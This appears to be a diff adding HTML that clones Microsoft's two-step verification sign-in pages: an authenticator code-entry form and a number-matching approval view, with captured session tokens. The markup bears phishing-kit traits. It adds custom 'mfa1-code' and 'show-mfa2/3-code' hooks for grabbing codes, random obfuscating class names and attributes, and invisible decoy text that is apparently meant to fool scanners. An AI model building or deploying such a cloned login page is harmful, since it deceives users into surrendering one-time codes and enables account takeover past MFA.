+<input data-bind="value: svr.sCtx" name="request" type="hidden" value="rQQIARAAjZI7bNNgAITtOjVJaaHqAEgMIGAB1cn_-xHXkZDI22mUNI5TomSJXPvPo7H9J37ESVgQLIwdWGBk7ARIlaoOqHMrpM6dEAsVAgkYoCOtWNjghtONp_vuHgWjMHEH_BHLnDsD2m3I6Og8_SVnaW7x_fdje2df3dnN_ry-LPxC2-SNrucN3EQshn3PxLgfxe12T0dRHVsxHGixXZI8IskTktyeEeOcKEFOEgWRjQO4IgIxKmkACCsGZCDkdIYHaIPReJ5jdCjyiNVEUWDF45nLa0nf67Lnhp3eFP2YibSxY7UG2PVeUp_ITMOXMrgQ5JOpFMevlxkDp-UxW-jw5ljJl5WkWGy0OkDLPiwUxw7iAgmCXNBMuRXNraRzfKrZmQqF6ni6mrGUJM5ycjLVT9W1cUEJcprRaaanqlmqFxv5IVZKAe6OBKPvZ52-D3GXE4BQr6GqY8nr-WGjMuHVickyjl1ly57c72ZKZk-bVmuMvxmH6aIScEO9NHFkKIE6YFTdHMHRWisuxX2xmZZWG0253B6oIm_nRjU7tZl3Ba9lVMqisrJN_ReotxR9tr6F7QOKxgNk94yP1G1k9cxJNOiZZ2UsF9sPdGRoTsdEdhdbyD3ndRQiP4TIz6F5QCXC4blF4hpxkzgNka9mz8i_iQ6uXH30uvj4HXEoezZxMBszjHWvWx3CtApHNcVDI1ewLKHTVlFFk5KcbTbjIOsLYOq596UE3KLJLZreoyNhapG4RaUr8IQmv9HUswvkXuRfNzq6SD6ZXwgTS5HI9K6_vKEey_sLxOmlw68HT198ef5V_g01"/>
+<input data-bind="value: currentPollStartTime" name="mfaLastPollStart" type="hidden" value="1655801034968"/>
+<input data-bind="value: currentPollEndTime" name="mfaLastPollEnd" type="hidden" value="1655801035874"/>
+
+<input data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: proofData" name="mfaAuthMethod" type="hidden" value="PhoneAppOTP"/>
+
+<!-- ko if: svr.canary -->
+<input data-bind="value: svr.canary" name="canary" type="hidden" value="ddUthRq1CS1vTQtevs5mm5gfSePa9A3nlZ60Eu50zts=4:1"/>
+<!-- /ko -->
+<!-- ko if: proofConfirmation --><!-- /ko -->
+
+<div aria-level="1" class="row text-title" data-bind="text: twoWayPollingNeeded ? str['CT_SAOTCAS_STR_Title'] : str['CT_SAOTCS_STR_Title']" id="idDiv_SAOTCC_Title" role="heading">Enter code</div>
+<div class="row text-body">
+    <div data-bind="component: { name: 'proof-image-control', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" data-bind="imgSrc, css: { 'small': small }" pngsrc="data:image/png;base64,<STRIPPED>"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
+    <div class="text-block-body overflow-hidden" data-bind="text: description" id="idDiv_SAOTCC_Description">Enter the code displayed in the Microsoft Authenticator app on your mobile device</div>
+</div>
+
+<div class="text-block-body">
+    <div class="form-group" id="idDiv_SAOTCC_OTCRow">
+        <div aria-live="assertive" class="mfa-error" role="alert" style="display:none;">
+				
+            <!-- ko if: error -->
+            <div class="row">
+                <div class="alert alert-error first" id="idDiv_SAOTCC_ErrorMsg_OTC">
+                    <span class="c48e1e03 a7117a ee628bc f4dab cc4bd9cd0 bf08c f779a3 da13f" data-a011b="e0f3c" data-b3a9a0="d11062" data-bind="html: error" data-cf3="e4c5989" data-d45="e594c" data-d92f37e="e0de" data-f18841="ece" data-fa142="fcfc49" id="idSpan_SAOTCC_Error_OTC" optimum="b664f60b688" ping="a419702a1a72" sandbox="c9acc3076e21" scope="d16c70f99e51" span="fccbb486e10c61"><span class="db021028 b8b51b fac258cb2 e53c47a b88b8a4 b35a41 ac4c520" data-a40e8="d48881" data-a5790b2="afa3" data-ce6="c935ec7" data-e5bde2a="e0d6810" data-fa5="be4443" data-fab74="ba432a" id="bc58235c795ce" integritykind="e3c117f570d" low="a3446aff81ba00a" method="d21da5acd9" muted="cf3600892d" open="db21b15b43"></span></span>
+                    <!-- ko if: svr.fShowViewDetailsLink -->
+                    <a aria-label="View debugging details for this error" class="no-wrap" data-bind="
+                        text: str['CT_STR_Error_ViewDetails'],
+                        clickExpr: onShowDebugDetails(debugDetails, true),
+                        ariaLabel: str['CT_STR_Error_ViewDetailsAriaLabel']" href="#" id="ViewDetails"><p class="d77667cb be7e78 fd50226 eba14b fb7be806 e2f10 adc51" data-afc6daa="f18046" data-bc4ae="ffa" data-c81ea5="b22d3" data-d52bb="d112e" high="dc80b587a31" id="b6dca69d662a23f" integritykind="c14a59daec" low="e7376ab14e57" method="d64639ea51" muted="f7f3ac179f2be99" style="display: inline;"></p></a>
+                    <!-- /ko -->
+                </div>
+            </div>
+            <!-- /ko -->
+        
+        </div>
+        <div class="errorDiv" id="idDiv_SAOTCC_Success_OTC" style="display: none;">
+            <span class="c3597b794 c926fd ac7b72 dae8e8 ae2121513 bc94622fe df67733cb success" data-c0f89d="d48" data-d3c81fe="ec97" data-fa1322="faedd0" id="idSpan_SAOTCC_Success_OTC" method="edaa7b5229" muted="c6098b57d1e" open="c12b072b3c32" optimum="dd29c598e0" ping="cb1ae6da52c73ae"></span><h2 id="References" style="position: absolute; color: transparent; background-color:transparent;">References</h2>
+        </div>
+        <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
+        <div class="textbox form-group" id="idDiv_SAOTCC_OTC">
+            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                publicMethods: otcInputTextbox.placeholderTextboxMethods,
+                params: {
+                    serverData: svr,
+                    hintText: str['CT_SAOTCC_STR_OTC_TBHint'] },
+                event: {
+                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+
+                <input aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" aria-labelledby="idDiv_SAOTCC_Title" aria-required="true" autocomplete="off" class="mfa1-code form-control" data-bind="
+                    attr: {
+                        'maxlength': otcLength,
+                        'aria-labelledby': 'idDiv_SAOTCC_Title',
+                        'aria-describedby': 'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC' },
+                    css: { 'has-error': error },
+                    textInput: otcInputTextbox.value,
+                    ariaLabel: str['CT_SAOTCC_STR_OTC_TBHint'],
+                    hasFocusEx: otcInputTextbox.focused,
+                    placeholder: $placeholderText" id="idTxtBx_SAOTCC_OTC" maxlength="6" name="mfa1-code" placeholder="Code" type="tel"/>
+            <!-- /ko -->
+<!-- /ko -->
+<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
+        </div>
+
+        <!-- ko if: twoFactorAuthPinEnabled --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+</div>
+<div class="text-block-body text-body" data-bind="visible: showSendNotification" style="display: none;">
+    <a data-bind="html: str['CT_SAOTCC_STR_SendNotification'], click: switchToSessionApproval_onClick" href="#" id="idA_SAOTCC_SendNotification"><span class="c722320 b02dfd daccc e860b27" data-b60="fe5" data-ce7="d8f113" data-de0="b11" data-e9d40="ccfe58" data-ea51="c2d" id="f21338d0708b" muted="de9a71bf75269dc" open="f2ec1b0e5959" optimum="f0b973159be873c" ping="b705be3c2b6" scope="b5d09825ec"></span></a>
+</div>
+
+<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }">
+    <div class="row">
+        <div class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()" id="idDiv_SAOTCC_TD_Section">
+            <div class="col-md-24 form-group no-margin-top checkbox" id="idDiv_SAOTCC_TD">
+                <label id="idLbl_SAOTCC_TD_Cb">
+                    <input aria-label="Don't ask again for 30 days" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.sTrustedDeviceCheckboxName }" id="idChkBx_SAOTCC_TD" name="rememberMFA" type="checkbox" value="true"/>
+                    <span class="ee06dd f119d8e feb5ca2c a4e894 a2681 c57aa99 c001eae" data-b22="a1cfe" data-ba3="f8e8d5" data-bind="text: str['CT_SAOTCC_STR_AddTD']" data-c82d6="e6450" data-cf7f="edae2db" data-d0f="dd3" headers="a97dfdb674e5d4" high="d732651df18" integritykind="b2e467e8dac4e" low="a8d03307c3" method="d26f00759ef"><p class="b484da c707eba65 c2f5e0ea ea7531aa c6b39a c012e3" data-b14="aa7d83" data-d48c="d03fa8" data-e8ad4="ac6da" high="efb588523aca8bc" id="fda8eb5bcd00e7b" integritykind="f0ab62f6e7" low="f3f9ff13680f5d2" method="b9440c19b4b" muted="eebb881052da" style="display: inline;"></p></span>
+                </label>
+            </div>
+        </div>
+
+        <!-- ko if: isInitialState || svr.urlMoreInfo -->
+        <div class="col-md-24">
+            <div class="text-13">
+                <!-- ko if: isInitialState && showSwitchProofsLink -->
+                <div class="form-group" data-bind="
+                        htmlWithBindings: str['CT_SAOTCC_STR_Toggle'],
+                        childBindings: { 'signInAnotherWay': { click: switchToOtcRequest_onClick } }" id="idDiv_SAOTCS_HavingTrouble">Having trouble? <a href="#" id="signInAnotherWay"><span class="d83bd2 bc8c1 aab48 a1f809a abf8fa ef7a1fa3 d6c8edb" data-a744="ba42953" data-bb5afd="e18" data-c2f28="c815cb" data-d15a1c="ca3" data-daac34d="df1e888" data-e5d42="d0da1b" data-e5f5f7e="b52" id="c8f7d5" method="fadae856c03" muted="f294ef55bcef0" open="a7a5f5653c2a4" optimum="aab945a5cc28005" ping="f1b806112e"></span></a></div>
+                <!-- /ko -->
+                <!-- ko if: svr.urlMoreInfo -->
+                <div class="form-group" data-bind="css: { 'form-group': !twoWayPollingNeeded }">
+                    <a aria-label="More information about two step verification" data-bind="
+                            text: str['CT_STR_More_Info'],
+                            href: svr.urlMoreInfo,
+                            ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" id="moreInfoUrl" target="_blank"><span class="b1e6e c8c6d7368 eaaca2ff8 eed59 c690c2f6 dd1bc4 af02cccf9" data-ca0b9a="e475" data-e4601="de4ca7" data-fade3="b17671" id="fa48ef68d18f36" low="a0e5f84cc3" method="e16f3f468a534" muted="efc63665e3a74" open="ea051b792f49" optimum="fccef49aafb"></span></a>
+                </div>
+                <!-- /ko -->
+            </div>
+        </div>
+        <!-- /ko -->
+    </div>
+</div>
+
+<div class="win-button-pin-bottom boilerplate-button-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+    <div class="row move-buttons" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+        <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: true,
+                primaryButtonId: 'idSubmit_SAOTCC_Continue',
+                primaryButtonText: str['CT_SAOTCC_STR_Continue'],
+                secondaryButtonId: 'idBtn_Back',
+                secondaryButtonText: str['CT_SAOTCC_STR_Cancel'],
+                isSecondaryButtonVisible: !showSwitchProofsLink,
+                isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
+                secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? 'idDiv_SAOTCC_Description' : null },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+
+    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+    <div class="inline-block" data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="submit-mfa1-code btn btn-block btn-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSubmit_SAOTCC_Continue" type="submit" value="Verify"/>
+    </div>
+</div></div>
+    </div>
+</div>
+
+<!-- ko if: tenantBranding.BoilerPlateText -->
+<div class="wrap-content boilerplate-text" data-bind="
+    htmlWithMods: tenantBranding.BoilerPlateText,
+    htmlMods: { filterLinks: svr.fIsHosted },
+    css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox }" id="idBoilerPlateText"><p class="d18b2 f5fcf7f2 ea04a2 b738f6c91 f497bcfb bbb7952" data-a7bca="cd0cfe" data-c6ff="a6e2444" data-e1aa="c5214dc" data-ed20bb="e87" data-f33f1="cf6c506" data-fe9b4="e16e96" data-ff76="be08" integritykind="b0f8efc15f3" low="cdd464fdfb55a4" method="f8d33f97b9fd91f" muted="bff9f0b5751" open="e9b852e124"></p><p class="asbox-body" style="position: absolute; display: block; width: 0; height: 0; overflow: hidden;">This -related article is a . You can help Wikipedia by .</p>
+</div>
+<!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+	
+	
+	<div class="show-mfa2-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'session-approval-view',
+                    params: {
+                        serverData: svr,
+                        sentProof: sharedData.sentProof,
+                        username: sharedData.username,
+                        supportsBack: true,
+                        isInitialState: isInitialState,
+                        sessionIdentifier: sharedData.sessionIdentifier,
+                        showCancelButton: sharedData.showCancelButton,
+                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
+                        currentPollStartTime: sharedData.currentPollStartTime,
+                        currentPollEndTime: sharedData.currentPollEndTime,
+                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
+                        sessionApprovalError: sharedData.sessionApprovalError,
+                        flowToken: sharedData.flowToken,
+                        entropy: sharedData.entropy },
+                    event: {
+                        cancel: view_onCancel,
+                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        submitReady: $tfaPage.view_onSubmitReady } }" data-showidentitybanner="true" data-viewid="6"><!--  -->
+
+<input data-bind="value: '22'" name="type" type="hidden" value="22"/>
+<input data-bind="value: svr.sCtx" name="request" type="hidden" value="rQQIARAAhVNPiON0FG7amdrWXXcYRdcFYQ5zEDHtL_-TgQXTSTtpTdJp07TTXmr-tmmT_NImbZoePe1xTgu7F8HjHAUX2ZNe57TIgjDiHoS9DCiLIqwgaFfPiw_e4z2-9w6P7_tKBbqM02WsDD7K4WVwdEgyNEWSlIESuEmjJGcAlCVsGsUsjthCOEOb-mK_tPfogztXL_6an9x_9MdJ5Yvx0wvkYBLHYXRUqSRJUoaO45p22YR-xdMDyw3GK_wbBHmCIA-zu3aAaupFNqIJFuNIjmEIBjDcNqiy3Nco2W-QytSMW0JvoqgADLpjQtrmYNOOFcGbtASNHOByst3dKH4DyN3qTO6O4-GJRiopAMNubyp1J96gP4iHQnuj9DVii1EKLq-vsrda_DKe4K8KXLgb-7ds0YELfxTCKH6Yu5-VNPS0o2_mprNwrXlfjUN1JIta7M1I3h2P0TbXSjstDbPj1kwdUY1hkzvrBMkKBoKSduIgRKGasmq3K9Wqx2Sq6jX706ZmwGMwIacS37A5HkbTlckKq8TfEKnndL0zerhAFVZfeseaveBrbt0Z1hTLV9QqrgW4gU3Mdl2wzupA9JUYzjbSNPTloL0eUJbcJtl-yAhcbwQ3rqoOxMnohMeY3nriEAE_5cmZVx14YTNYAFpfU9W1ZbUEpaaLXg_U6jVqZttiY15fSpQYhHgNN22DTano1AMY1mkqSbU5k8YXufdfQ-8K_yqX3zY-DB7nDh2a4TDOMFDMxkyUpG0cNXBORwFDW6TjEIClycscA0M7cK2DcAEd17Nfp5wVXmn9O4nQt8u85_2cO9RNEy6D-JPQ09Mtb5aj-66X-rblmrr36qqsL5_sINc77xbye3duIweZD98BuaNCobSXuZ05yLzcQb7c3er3wU-_fvfen_nGvd4Pb54_72cudytBAjW-FzWHHVZqKkHLT4xVsuhFIhltYgOslWXYXrM9STGSu-wRdp5HzvP5y3yxIYyUWpcegRf57L03kMfF_3XC5zduFjL7xWLhuvjZ750fxasbb5dKS3fkwe0TdrT_n0O-vZl5-db3fz949vWzp7-I17c-5vlUIsS1R3B9UuKI-lnod6CT6LLextWwwhjD-SkTrQTsOLn7Dw2"/>
+<input data-bind="value: currentPollStartTime" name="mfaLastPollStart" type="hidden" value="1683900946358"/>
+<input data-bind="value: currentPollEndTime" name="mfaLastPollEnd" type="hidden" value="1683900947657"/>
+
+<!-- ko if: twoWayPollingNeeded -->
+    <!-- ko if: isCompanionApp --><!-- /ko -->
+
+    <!-- ko ifnot: isCompanionApp -->
+        <input data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: 'PhoneAppNotification'" name="mfaAuthMethod" type="hidden" value="PhoneAppNotification"/>
+    <!-- /ko -->
+<!-- /ko -->
+
+<div aria-level="1" class="row text-title" data-bind="text: title" id="idDiv_SAOTCAS_Title" role="heading">Approve sign in request</div>
+<div class="row text-body">
+    <div data-bind="component: { name: 'proof-image-control', params: { type: PROOF.Type.TOTPAuthenticatorV2, small: true, animate: true } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small animate-pulse" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Certificate --><!-- /ko -->
+
+<!-- ko if: svr.fDisplayCompanionApp -->
+    <!-- ko if: type === PROOF.Type.CompanionApp --><!-- /ko -->
+<!-- /ko --></div>
+    <div class="text-block-body overflow-hidden">
+        <div data-bind="htmlWithBindings: description, childBindings: { 'idSpan_SAOTCAS_DescSessionID': { css: { 'bold': true } } }" id="idDiv_SAOTCAS_Description">Open your Authenticator app, and enter the number shown to sign in.</div>
+        <!-- ko if: description2 --><!-- /ko -->
+    </div>
+</div>
+
+<!-- ko if: displaySign -->
+<div class="section">
+    <div class="row text-body">
+        <div class="displaySign" data-bind="text: displaySign" id="idRichContext_DisplaySign"></div>
+    </div>
+</div>
+
+<div class="row text-body">
+    <div class="richtext-warning" data-bind="text: str['CT_SAOTCRC_STR_Missing_Numbers']">No numbers in your app? Make sure to upgrade to the latest version.</div>
+</div>
+<!-- /ko -->
+
+<div>
+    <!-- ko if: doPolling --><!-- /ko -->
+</div>
+
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+    <div class="row">
+        <div class="row no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown" style="display: none;">
+            <div class="col-md-24 form-group no-margin-top checkbox">
+                <label id="idLbl_SAOTCAS_TD_Cb">
+                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
+                    <input aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description" aria-label="Don't ask again for undefined days" data-bind="
+                        attr: { name: svr.sTrustedDeviceCheckboxName },
+                        ariaLabel: str['CT_SAOTCAS_STR_AddTD'],
+                        ariaDescribedBy: ['idDiv_SAOTCAS_Title', 'idDiv_SAOTCAS_Description'].concat(description2 ? ['idDiv_RichContext_Description'] : []).join(' '),
+                        hasFocusEx: tdCheckbox.isShown,
+                        checked: tdCheckbox.isChecked,
+                        disable: tdCheckbox.isDisabled" id="idChkBx_SAOTCAS_TD" name="rememberMFA" type="checkbox" value="true"/>
+                    <span class="cdeaaea7 b8f5ea4e e5926143 f9d2c f58b40bd d5708cc a5b251" data-ada53="bfe5ed2" data-bind="text: str['CT_SAOTCAS_STR_AddTD']" data-d1e59d8="bafcfb5" data-d5e8a6b="f4cb" data-e293="a7fc2f" data-e7db0="a51" data-fdd1ed="a1c0" method="d1a19848ead8" muted="a717ac28b63b" open="d422aef77113a" optimum="e242b5894461c73" ping="dfdd1be0be4b7"><p class="ff5433 d233e a4b632 c5aad5 a8a8d f367fa800" data-aa7f="a61" data-c71eb72="faad78" data-e7d="e704f1" data-e914="e542b" headers="d9a4ad4b070a7" high="fbd7e3451d" id="c4b03cbf" integritykind="fec3fe7a6e84" low="ceb725f68e" method="fa68ca22c3f0" style="display: inline;"></p></span><b style="position: absolute; display: block; width: 0; height: 0; overflow: hidden;">Mordellistenochroa</b>
+                </label>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-24">
+                <div class="text-13">
+                    <!-- ko if: showSwitchProofsLink -->
+                    <div class="form-group" data-bind="
+                            css: { 'no-margin-bottom': !svr.urlMoreInfo },
+                            htmlWithBindings: toggleText,
+                            childBindings: {
+                                'signInAnotherWay': {
+                                    click: switchToOtcRequest_onClick,
+                                    hasFocusEx: !tdCheckbox.isShown,
+                                    ariaDescribedBy: ['idDiv_SAOTCAS_Title', 'idDiv_SAOTCAS_Description'].concat(description2 ? ['idDiv_RichContext_Description'] : []).join(' ') } }" id="idDiv_SAOTCS_HavingTrouble"><a aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description" href="#" id="signInAnotherWay"><span class="adf28 ee770 d15e73a7 f5752 dcd067ad" data-b15a="f5e17" data-c82bb="e66a9d" data-d3452c="de1467" data-ddbc3="a93b4" data-ded8104="daa0" data-e3c4c2="f288f" id="e68c51d28bd2" integritykind="dd72e77f158" low="b37d3c42342" method="d36b874411f12c0" muted="f40e43ba120" open="c01443ee4b9"></span></a></div>
+                    <!-- /ko -->
+
+                    <!-- ko if: svr.urlMoreInfo -->
+                    <div class="form-group no-margin-bottom">
+                        <a aria-label="More information about two step verification" data-bind="text: str['CT_STR_More_Info'], href: svr.urlMoreInfo, ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" id="moreInfoUrl" target="_blank"><p class="ffa335 c2998e6 e4c01 b8963502e ecae1 e0f7fd a5893 f0af3" data-a1d3f33="dad5cda" data-b8f835c="fd90eb" data-ce2e4="fc7f8" id="a043" low="f84444da6b3" method="f25716afba50f" muted="f79e0bf3de93" open="e8791776b8" optimum="cba1177ade2c0" style="display: inline;"></p></a>
+                    </div>
+                    <!-- /ko -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+            <div data-bind="component: { name: 'footer-buttons-field',
+                params: {
+                    serverData: svr,
+                    isPrimaryButtonVisible: false,
+                    isSecondaryButtonVisible: !showSwitchProofsLink,
+                    secondaryButtonText: str['CT_SAOTCC_STR_Cancel'] },
+                event: {
+                    secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin },
+    externalCss: { 'button-field-container': true }" style="display: none;">
+
+    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+    <div class="button-item ext-button-item" data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="win-button button_primary button ext-button primary ext-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSIButton9" style="display: none;" type="submit" value="Next"/>
+    </div>
+</div></div>
+        </div>
+    </div>
+</div>
+
+<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+	<div class="show-mfa3-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
